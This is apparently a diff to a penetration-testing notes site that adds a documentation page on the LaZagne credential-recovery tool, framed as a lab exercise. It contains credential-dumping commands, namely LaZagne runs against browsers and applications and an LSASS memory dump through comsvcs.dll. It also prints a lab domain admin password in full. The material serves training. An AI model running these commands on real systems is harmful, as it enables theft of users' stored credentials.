@@ -9,6 +9,38 @@ hideFooterPagination: true
 
 {/* Generated from Commands/lazagne.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## LaZagne: choose the operation and read the result
+
+Read application-stored credentials accessible to the current Windows user.
+
+### What the result establishes
+
+Read each application's result and the identity under which it was collected.
+
+### Prerequisites and common failures
+
+A stored credential may be encrypted for a different user or require a logged-on context; absent output does not prove no applications store secrets.
+
+### Example 1: All supported applications
+
+Run in: **Windows PowerShell**.
+
+```powershell
+.\LaZagne.exe all
+```
+
+### Example 2: Browsers only
+
+Run in: **Windows PowerShell**. Results depend on the user context and whether an application actually saved credentials.
+
+```powershell
+.\LaZagne.exe browsers
+```
+
+## Saved commands and notebook recipes
+
+Read application-stored credentials accessible to the current Windows user.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=lazagne) · [All tools](/index)
@@ -50,6 +82,13 @@ xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore /drive:kali,/home/k
 #   inside Windows:  copy \\tsclient\kali\Windows\LaZagne.exe C:\Users\Public\
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot) · [Windows Remote Access: RDP, WinRM, and WMI — Example 7: 11. File transfer over a pivot](/enumeration/windows-remote-management-protocols-cheat-sheet#example-7-11-file-transfer-over-a-pivot)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="9. Credential dumping">
@@ -65,6 +104,13 @@ rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Windows\Temp\l
 LaZagne.exe all                 :: stored app/browser/wifi creds (use the .EXE, no Python needed)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 9. Credential dumping](/cheatsheets/ad-attack-path-worked-example#9-credential-dumping)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Active Directory Attack Path: Worked Lab**
 
 Context from the notebook: LaZagne on Windows with no Python:  download the  standalone  LaZagne.exe  (PyInstaller build from the releases page) — it bundles Python + deps. Bring it over via  \\tsclient\  (RDP drive redirect) or the DMZ http server, then  LaZagne.exe all . Result here:  sekurlsa::logonpasswords  revealed  stom : calves‑warp‑learning1  (current DA password) — the key that opened the DC.
@@ -73,6 +119,13 @@ Context from the notebook: LaZagne on Windows with no Python:  download the  sta
 LaZagne.exe
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 9. Credential dumping](/cheatsheets/ad-attack-path-worked-example#9-credential-dumping) · [Windows Post-Exploitation: Field Reference — 4. DPAPI / browsers / app creds](/cheatsheets/windows-post-exploitation#4-dpapi-/-browsers-/-app-creds)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Active Directory Attack Path: Worked Lab**
 
 Context from the notebook: LaZagne on Windows with no Python:  download the  standalone  LaZagne.exe  (PyInstaller build from the releases page) — it bundles Python + deps. Bring it over via  \\tsclient\  (RDP drive redirect) or the DMZ http server, then  LaZagne.exe all . Result here:  sekurlsa::logonpasswords  revealed  stom : calves‑warp‑learning1  (current DA password) — the key that opened the DC.
@@ -80,6 +133,13 @@ Context from the notebook: LaZagne on Windows with no Python:  download the  sta
 ```text
 LaZagne.exe all
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 9. Credential dumping](/cheatsheets/ad-attack-path-worked-example#9-credential-dumping) · [Windows Post-Exploitation: Field Reference — 4. DPAPI / browsers / app creds](/cheatsheets/windows-post-exploitation#4-dpapi-/-browsers-/-app-creds) · [Find Credentials on Windows — Key Takeaways](/password-attacks/credential-hunting-in-windows#key-takeaways)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -93,6 +153,13 @@ LaZagne.exe all
 LaZagne.exe browsers
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Find Credentials on Windows — Browser credentials](/password-attacks/credential-hunting-in-windows#browser-credentials)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="LaZagne (the go-to)">
@@ -105,6 +172,13 @@ LaZagne.exe browsers
 LaZagne.exe all
 LaZagne.exe browsers      # only browser-stored creds
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Find Credentials on Windows — LaZagne (the go-to)](/password-attacks/credential-hunting-in-windows#lazagne-the-go-to)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -120,6 +194,13 @@ LaZagne.exe all                    :: browsers, wifi, RDP, email, etc. (STANDALO
 :: SharpChrome / SharpDPAPI for browser cookies + saved logins
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — 4. DPAPI / browsers / app creds](/cheatsheets/windows-post-exploitation#4-dpapi-/-browsers-/-app-creds)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Key Takeaways">
@@ -134,6 +215,21 @@ Context from the notebook: Automate the sweep with  mimipenguin  and  LaZagne al
 LaZagne all
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Find Credentials on Linux — Key Takeaways](/password-attacks/credential-hunting-in-linux#key-takeaways)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Find Credentials on Windows](/password-attacks/credential-hunting-in-windows)
+
+{/* VAULT_RELATED_END */}
